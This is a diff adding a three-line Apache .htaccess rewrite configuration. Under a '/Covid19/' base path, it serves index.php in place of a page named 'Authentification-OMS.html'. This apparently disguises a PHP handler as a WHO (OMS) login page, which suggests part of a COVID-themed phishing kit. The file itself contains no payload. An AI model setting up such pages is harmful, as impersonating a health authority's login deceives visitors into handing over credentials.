@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteBase /Covid19/
+RewriteRule ^Authentification-OMS.html$ index.php [L]
